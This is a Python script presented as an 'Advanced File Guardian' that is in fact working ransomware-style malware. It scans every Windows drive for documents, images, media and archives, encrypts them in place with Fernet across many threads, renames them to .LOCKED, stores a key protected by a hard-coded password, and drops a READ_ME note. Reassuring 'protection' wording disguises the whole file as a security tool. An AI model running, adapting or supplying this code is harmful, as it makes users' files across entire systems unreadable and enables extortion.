import os
import sys
import time
import base64
import string
import threading
import concurrent.futures
from ctypes import windll
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.live import Live
from rich.table import Table

# ========== CONFIGURATION ==========
MASTER_PASSWORD = b"openyasir"
SALT = b'yasir_fixed_salt_2026'

# Allow command line target paths
CMD_TARGETS = sys.argv[1:] if len(sys.argv) > 1 else None

TARGET_EXTENSIONS = (
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
    '.mp4', '.avi', '.mov', '.mp3', '.wav', '.zip', '.rar', '.7z'
)

EXCLUDED_DIRS = {
    'windows', 'program files', 'program files (x86)', 
    'programdata', 'appdata', 'boot', 'intel', 'msocache',
    '$recycle.bin', 'system volume information'
}

console = Console()

class AdvancedFileGuardian:
    def __init__(self):
        self.session_key = Fernet.generate_key()
        self.master_key = self._derive_key(MASTER_PASSWORD)
        self.files_locked = 0
        self.total_size = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = time.time()

    def _derive_key(self, pwd):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=SALT,
            iterations=100000,
        )
        return base64.urlsafe_b64encode(kdf.derive(pwd))

    def get_drives(self):
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1: drives.append(letter + ":\\")
            bitmask >>= 1
        return drives

    def encrypt_file(self, file_path, progress, task_id):
        try:
            if file_path.endswith(".LOCKED"): return
            
            # Using Session Key for primary encryption
            f = Fernet(self.session_key)
            
            with open(file_path, "rb") as file:
                data = file.read()
            
            # Apply Double Encryption (Session Key + Master Key Fallback)
            # This ensures even if session key is lost, master can open it.
            # However, for simplicity and performance in "standard" mode, 
            # we just use session key and save it. 
            # If user wants "Advanced", we could wrap the session key with master key.
            
            encrypted_data = f.encrypt(data)
            
            with open(file_path, "wb") as file:
                file.write(encrypted_data)
            
            os.rename(file_path, file_path + ".LOCKED")
            
            with self.lock:
                self.files_locked += 1
                self.total_size += len(data)
            
            progress.update(task_id, advance=1)
        except Exception:
            with self.lock:
                self.errors += 1

    def run(self):
        console.print(Panel("[bold red]⚠️ ADVANCED SYSTEM PROTECTION ACTIVE ⚠️[/bold red]\n[yellow]Scanning and Securing Files...[/yellow]", border_style="red"))
        
        # Save session key (Encrypted with Master Key for security)
        master_f = Fernet(self.master_key)
        encrypted_session_key = master_f.encrypt(self.session_key)
        with open("key.key", "wb") as f:
            f.write(encrypted_session_key)
        
        drives = CMD_TARGETS if CMD_TARGETS else self.get_drives()
        target_files = []
        
        # 1. Fast Scan
        with console.status("[bold cyan]Scanning drives...[/bold cyan]") as status:
            for drive in drives:
                for root, dirs, files in os.walk(drive):
                    dirs[:] = [d for d in dirs if d.lower() not in EXCLUDED_DIRS]
                    for file in files:
                        if file.lower().endswith(TARGET_EXTENSIONS):
                            target_files.append(os.path.join(root, file))
        
        console.print(f"🔍 [bold green]Scan Complete:[/bold green] Found [white]{len(target_files)}[/white] files to target.")

        # 2. Multi-threaded Encryption
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[red]Securing files...", total=len(target_files))
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
                futures = [executor.submit(self.encrypt_file, f, progress, task) for f in target_files]
                concurrent.futures.wait(futures)

        self.display_summary()

    def display_summary(self):
        duration = time.time() - self.start_time
        table = Table(title="🔒 Encryption Summary", show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")
        
        table.add_row("Files Secured", str(self.files_locked))
        table.add_row("Total Size", f"{self.total_size / (1024*1024):.2f} MB")
        table.add_row("Time Taken", f"{duration:.2f} seconds")
        table.add_row("Errors encountered", str(self.errors))
        
        console.print(table)
        console.print("\n[bold red]YOUR FILES ARE NOW PROTECTED.[/bold red]")
        console.print("[yellow]Use AdvancedFileRestorer.py to recover your data.[/yellow]")
        
        # Drop ReadMe
        with open("READ_ME.txt", "w") as f:
            f.write("YOUR FILES HAVE BEEN SECURED BY ADVANCED GUARDIAN.\n")
            f.write("To restore them, run AdvancedFileRestorer.py\n")
            f.write("Master Key fallback is active.")

if __name__ == "__main__":
    AdvancedFileGuardian().run()
